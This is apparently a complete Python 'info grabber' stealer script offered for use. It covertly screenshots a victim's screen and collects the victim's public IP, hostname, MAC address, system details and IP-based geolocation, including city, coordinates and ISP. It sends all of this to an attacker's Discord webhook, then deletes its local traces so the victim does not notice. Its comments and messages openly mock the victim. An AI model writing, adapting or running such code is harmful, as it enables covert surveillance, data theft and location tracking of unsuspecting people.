from discord_webhook import DiscordWebhook, DiscordEmbed
import socket
import requests
import platform
import uuid
import os
import sys
import json
from PIL import ImageGrab
# It work without it but if you have some enable it and check if it was the problem
# I commented this after the script was ready after edits and I saw no errors so idk if it is an optymalization :)
#import subprocess
#import urllib.request

#################### \_ CONFIGURATION _/ ########################

# Paste your webhooh url inside ''

your_webhook_url = ''

#################### \_ CONFIGURATION _/ ########################

# Create a name that shows as a profile name that sent the message with obtained information.

your_webhook_nickname = ''

# example: your_webhook_nickname = 'INFO-Grabber'

#################### \_ CONFIGURATION _/ ########################

# Select sending method by commenting the line you don't want.

# Default method is sending by file.

sending_method = 'file'#  Creates a file with all obtained info, then it sends it to discord webhook, then the file gets deleted.
#sending_method = 'embed'# (Doesn't create a file) Sends all info to discord webhook.

#################### \_ CONFIGURATION _/ ########################

# Grabs screenshoot
screenshot = ImageGrab.grab()
screenshot.save('97ufg98jeaef4.png')

#           IP ADDRESS
ip = requests.get('https://checkip.amazonaws.com').text.strip()

#           HOSTNAME
hostname = socket.gethostname()

#     OPERATING SYSTEM CHECK
if sys.platform.startswith('win'):
    user_system = 'windows'
elif sys.platform.startswith('linux'):
    user_system = 'Linux'
else:
    user_system = 'other'

# Get the MAC address as a 48-bit integer
mac_int = uuid.getnode()

# Convert the MAC address into a string
mac_str = ':'.join(['{:02x}'.format((mac_int >> i) & 0xff) for i in range(0,8*6,8)][::-1])

#############################


#     WRITES INFO INTO FILE 
if sending_method == 'file':
    f = open("z3k1wm6pf37wash4.txt", "w")

    f.write('IP address: ')
    f.write(ip)

    f.write('\n')

    f.write('HOSTNAME: ')
    f.write(hostname)

    f.write('\n')

    f.write('MAC ADDRESS: ')
    f.write(mac_str)

    f.write('\n')

    f.write('OPERATING SYSTEM: ')
    f.write(user_system)

    f.write('\n')

    f.write('OPERATING SYSTEM VERSION: ')
    f.write(platform.release())

    f.write('\n')

    f.write('CPU ARCHITECTURE: ')
    f.write(platform.machine())

    #f.write('\n')
    #f.write('CPU INFO: ')  # doesn't show my cpu info, try if it will on your pc.
    #f.write(platform.processor())


############################

#      Discord web hook

content = '@everyone\nINFO-GRABBER v0.4\nSuccessfully grabbed a lot of juicy informations about some idiot :D'

webhook = DiscordWebhook(url=your_webhook_url, username="INFO-GRABBER", content=content)

# Sending file
if sending_method == 'file':
    with open("z3k1wm6pf37wash4.txt", "rb") as f:
        webhook.add_file(file=f.read(), filename='z3k1wm6pf37wash4.txt')

# Embed info
if sending_method == 'embed':

    embed = DiscordEmbed(title='GRABBING STARTED', color=242424)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='IP address:', value=ip)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='HOSTNAME: ', value=hostname)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='MAC ADDRESS: ', value=mac_str)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='OPERATING SYSTEM: ', value=user_system)
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='OPERATING SYSTEM VERSION: ', value=platform.release())
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='', color=242424)
    embed.add_embed_field(name='CPU ARCHITECTURE: ', value=platform.machine())
    webhook.add_embed(embed)

    embed = DiscordEmbed(title='GRABBING ENDED', color=242424)
    webhook.add_embed(embed)

#   Screenshoot send and delete
if sending_method == 'file':
    # Sends screenshoot
    with open('97ufg98jeaef4.png', 'rb') as imagine:
        webhook.add_file(file=imagine.read(), filename='97ufg98jeaef4.png')
    os.remove("97ufg98jeaef4.png")

if sending_method == 'embed':
    # Sends screenshoot
    with open('97ufg98jeaef4.png', 'rb') as imagine:
        webhook.add_file(file=imagine.read(), filename='97ufg98jeaef4.png')
    os.remove("97ufg98jeaef4.png")

# Deletes locally created info file that was sent to discord so victim won't see that it was a grabber
if sending_method == 'file':
    os.remove("z3k1wm6pf37wash4.txt")


#  Extended JSON INFORMATION
def get_ext_ip():
    response = requests.get('https://api64.ipify.org?format=json').json()
    return response["ip"]
get_ext_ip()

def get_ext_info():
    ip_address = get_ext_ip()
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    ext_info_grabbed = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name"),
        "latitude": response.get("latitude"),
        "longitude": response.get("longitude"),
        "timezone": response.get("timezone"),
        "country_calling_code": response.get("country_calling_code"),
        "currency": response.get("currency"),
        "currency_name": response.get("currency_name"),
        "ISP": response.get("org")
    }
    return ext_info_grabbed
get_ext_info()

ext_info_grabbed = get_ext_info()

with open('extendedinfotakethel.json', 'w') as owo:
    json.dump(ext_info_grabbed, owo)

with open("extendedinfotakethel.json", "rb") as uwu:
    webhook.add_file(file=uwu.read(), filename='extendedinfotakethel.json')

response = webhook.execute()

os.remove("extendedinfotakethel.json")